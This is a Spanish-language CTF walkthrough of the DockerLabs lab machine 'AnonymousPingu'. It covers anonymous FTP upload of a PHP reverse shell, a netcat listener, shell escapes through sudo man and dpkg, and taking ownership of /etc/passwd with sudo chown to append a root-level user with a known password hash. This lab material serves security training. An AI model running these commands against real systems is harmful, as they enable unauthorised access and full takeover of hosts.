# AnonymousPingu — DockerLabs.es 🐳

<img width="548" height="298" alt="1" src="https://github.com/user-attachments/assets/31ef235e-c642-42c1-a744-4b2e2efa1d1a" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Iniciamos con un escaneo en nmap:

```bash
sudo nmap -p- --min-rate 2000 -A -sS -Pn -n -oN escaneo.txt 172.17.0.2
```
```bash
Nmap scan report for 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
| -rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
| drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
| drwxr-xr-x    2 0        0            4096 Apr 28  2024 heustonn-html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
| -rw-r--r--    1 0        0           20162 Apr 28  2024 index.html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
| -rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
|_drwxrwxrwx    1 33       33           4096 Apr 28  2024 upload [NSE: writeable]
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Mantenimiento
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Unix
```

Tenemos el puerto 21 y 80 abiertos.

Luego hacemos un fuzzing web a la ip

<img width="1014" height="471" alt="2" src="https://github.com/user-attachments/assets/19699dc6-3b4b-4fbc-a7d8-42a401dd24c3" />

Y encontramos un directorio interesante “/upload”.

Revisamos la pagina web y no encontramos nada interesante, por lo que probamos ingresar mediante el puerto ftp con el usuario anonymous:

<img width="395" height="202" alt="3" src="https://github.com/user-attachments/assets/89e9c033-376a-43f8-91ea-457cb6c898e0" />


---

## 2. Explotación

Luego creamos una reverse shell en la página revshells.com para obtener una conexión con la máquina victima.

<img width="554" height="486" alt="4" src="https://github.com/user-attachments/assets/3e89ba2d-9315-4b31-a7a9-618c96beffa4" />

Y lo guardamos en un archivo llamado “virus.php”

Luego vamos al directorio /upload y subimos la reverse shell creada.

Utilizamos el comando: `put virus.php`

<img width="1345" height="148" alt="5" src="https://github.com/user-attachments/assets/5c3eeca2-88e4-4aef-bb55-f9b564a9d7a7" />


Y si entramos a la url http://172.17.0.2/upload/ nos encontramos con el archivo subido.

<img width="510" height="257" alt="6" src="https://github.com/user-attachments/assets/db5e7ca4-3ee5-4a67-86b1-4deb9c84e084" />

Nos ponemos en escucha con netcat:

<img width="284" height="101" alt="7" src="https://github.com/user-attachments/assets/22bf747d-2daa-4a90-a087-6e084cc13b1b" />

Y hacemos click en el archivo “virus.php”

<img width="572" height="317" alt="8" src="https://github.com/user-attachments/assets/a2be6e29-cbaf-47ed-80ba-7fd8cd05f217" />

<img width="598" height="201" alt="9" src="https://github.com/user-attachments/assets/45c46c63-71c0-40ce-824b-7465653f3054" />

Luego le hacemos el tratamiento de la TTY 

```bash
script /dev/null -c bash
ctrl+z 
stty raw -echo; fg

reset xterm

export TERM=xterm
export SHELL=bash
```


---

## 3. Escalada de Privilegios

Ponemos el comando sudo -l y podemos ejecutar el binario man como sudo pero con el usuario “pingu”

<img width="416" height="166" alt="10" src="https://github.com/user-attachments/assets/e1b1e2f7-f8ea-4b95-bbb4-11d21252e04d" />

por lo que haríamos:

```bash
sudo -u pingu /usr/bin/man man
!/bin/bash
```

<img width="698" height="433" alt="11" src="https://github.com/user-attachments/assets/c47c0937-103b-43c0-858d-d4137dedd5bb" />

Y si aplicamos un sudo -l podemos pivotar al usuario “gladys” utilizando dos binario: nmap y dpkg

<img width="747" height="153" alt="12" src="https://github.com/user-attachments/assets/f25480ed-75f6-4958-9700-ef4d8f94b23f" />

En este caso utilizaremos el binario dpkg de la siguiente forma:

```bash
sudo -u gladys /usr/bin/dpkg -l
!/bin/bash
```

<img width="700" height="435" alt="13" src="https://github.com/user-attachments/assets/b3f423f9-8a94-40bf-9bad-6b8571f56344" />

Si aplicamos sudo -l nuevamente, podemos ver que podemos ejecutar el binario chown para ser root

<img width="599" height="157" alt="14" src="https://github.com/user-attachments/assets/25fc5c50-528e-4ae7-a28a-51901f99e65a" />

Para explotar este binario tenemos generar un hash para la palabra admin, vamos a crear un usuario y vamos a hacer al usuario gladys propietario del archivo /etc/passwd de la siguiente manera:

```bash
openssl passwd admin
resultado: $1$qf50Kkqc$MrQh6kkdRxtlB.1PQk4T3.
```

Luego hacemos propietario de /etc/passwd al usuario gladys con el siguiente comando:

```bash
sudo /usr/bin/chown gladys: /etc/passwd 
```

Luego hacemos la creación del usuario y en la ruta ponemos el hash adquirido anteriormente por ejemplo, creamos el usuario “usuario”

```bash
echo 'usuario:hashcreado:0:0::/home/usuario:/bin/bash' >> /etc/passwd
```

El resultado final sería:

```bash
echo 'usuario:$1$qf50Kkqc$MrQh6kkdRxtlB.1PQk4T3.:0:0::/home/usuario:/bin/bash' >> /etc/passwd
```

Por último ingresamos con el usuario creado de la siguiente forma:

su usuario

password: admin

<img width="951" height="186" alt="15" src="https://github.com/user-attachments/assets/6b8a42ba-afd2-4342-a16c-c621ac975446" />


**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Reconocimiento con Nmap
- Enumeración de servicios
- Escalada de privilegios
